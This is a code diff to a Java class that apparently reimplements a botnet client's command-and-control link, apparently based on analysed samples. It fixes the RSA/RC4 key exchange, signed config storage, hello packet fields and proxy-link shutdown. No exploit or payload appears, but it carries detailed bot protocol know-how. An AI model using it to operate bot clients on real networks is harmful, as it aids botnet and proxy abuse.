@@ -157,9 +157,9 @@ public class Link extends TCPSocket {
             readBuffer.clear();
         }
 
-        if (((readBuffer.size <= 4) && (receiveBuffer.size > 0)) || (status == LinkStatus.ONLINE)) {
-            parseCommand();
-        } else {
+        // Like link.onRead() in the samples: only a link that has sent its public key and is waiting
+        // for the answer (KEY_EXCHANGE_DONE) looks for the key, anything else is ignored until ONLINE
+        if ((status == LinkStatus.KEY_EXCHANGE_DONE) && (readBuffer.size > 4)) {
             // Get data length and shift over the size
             int dataLength = readBuffer.asDWord();
             readBuffer.shift(4);
@@ -168,36 +168,37 @@ public class Link extends TCPSocket {
                 LOGGER.warning(" [!] Data claims we received " + dataLength
                         + " bytes of data, larger than what the read buffer says we have - exiting!");
                 close();
-            } else {
-                LOGGER.info(" [+] Attempting to initialize encryption");
-                // Copy first section, which is the encrypted with this bots public RSA key that we just sent to the
-                // server.
-                // The decrypted part is then used as the rc4 key to decode the rest
-                byte[] encryptedKey = new byte[dataLength];
-                System.arraycopy(readBuffer.array(), 0, encryptedKey, 0, encryptedKey.length);
-                readBuffer.shift(dataLength);
-
-                // Decrypt the key used to initialize the rc4 streams
-                byte[] rc4key = new byte[100];
-                System.arraycopy(owner.RSALocal.decrypt(encryptedKey), 1, rc4key, 0, rc4key.length);
-
-                // Configure rc4 objects and toggle encryption
-                rc4Instream = new RC4(rc4key);
-                rc4Outstream = new RC4(rc4key);
-
-                // Toggle status, respond to server and mark connection as OK
-                status = LinkStatus.ONLINE;
-                sendHello();
-                owner.connectionManager.connectOk();
-
-                // Check for any extra commands
-                receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
-                readBuffer.clear();
-                // Parse any command we got out of the above buffer
-                if ((receiveBuffer.size > 0) || (status == LinkStatus.ONLINE)) {
-                    parseCommand();
-                }
+                return;
             }
+
+            LOGGER.info(" [+] Attempting to initialize encryption");
+            // Copy first section, which is the encrypted with this bots public RSA key that we just sent to the
+            // server.
+            // The decrypted part is then used as the rc4 key to decode the rest
+            byte[] encryptedKey = new byte[dataLength];
+            System.arraycopy(readBuffer.array(), 0, encryptedKey, 0, encryptedKey.length);
+            readBuffer.shift(dataLength);
+
+            // Decrypt the key used to initialize the rc4 streams
+            byte[] rc4key = new byte[100];
+            System.arraycopy(owner.RSALocal.decrypt(encryptedKey), 1, rc4key, 0, rc4key.length);
+
+            // Configure rc4 objects and toggle encryption
+            rc4Instream = new RC4(rc4key);
+            rc4Outstream = new RC4(rc4key);
+
+            // Anything after the key is already encrypted
+            receiveBuffer.put(rc4Instream.crypt(readBuffer.array()));
+            readBuffer.clear();
+
+            // Toggle status, respond to server and mark connection as OK
+            status = LinkStatus.ONLINE;
+            sendHello();
+            owner.connectionManager.connectOk();
+        }
+
+        if ((receiveBuffer.size > 0) && (status == LinkStatus.ONLINE)) {
+            parseCommand();
         }
     }
 
@@ -286,8 +287,9 @@ public class Link extends TCPSocket {
                         .asInt64())
                         && owner.RSAGlobal.check(dataPacket.getDigest(), signPacket.array())) {
                     // Delete old one and save new config
+                    // The whole SET packet (Sign + DATA) is what the bot stores
                     owner.config.packet.delete("SET");
-                    owner.config.packet.add(dataPacket);
+                    owner.config.packet.add(set);
                     owner.config.save(owner.sessionDirectory);
                     owner.connectionManager.load();
                     owner.sendSET();
@@ -319,12 +321,12 @@ public class Link extends TCPSocket {
                 if ((killProxyLinkPacket.getByName("DT") == null) | (channelPacket.buffer.size == 0)) {
                     sendError(1, 0);
                 } else {
-                    // Ensure we flush the write buffer if it is not yet done
+                    // Flush what is still queued first, otherwise kill the ProxyLink right away
                     if (proxyLink.writeBuffer.size > 0) {
                         proxyLink.sendAndClose = true;
+                    } else {
+                        proxyLink.close();
                     }
-                    // kill ProxyLink
-                    proxyLink.close();
                 }
             }
         }
@@ -362,8 +364,7 @@ public class Link extends TCPSocket {
 
         Packet lidPacket = helloPacket.add();
         lidPacket.tag = "LID";
-        // Normally it's in SET, removed here though .getByName("SET")
-        lidPacket.buffer.putInt64(owner.config.packet.getByName("DATA").getByName("LID").asInt64());
+        lidPacket.buffer.putInt64(owner.config.packet.getByName("SET").getByName("DATA").getByName("LID").asInt64());
 
         Packet connectionTypePacket = helloPacket.add();
         connectionTypePacket.tag = "CT";
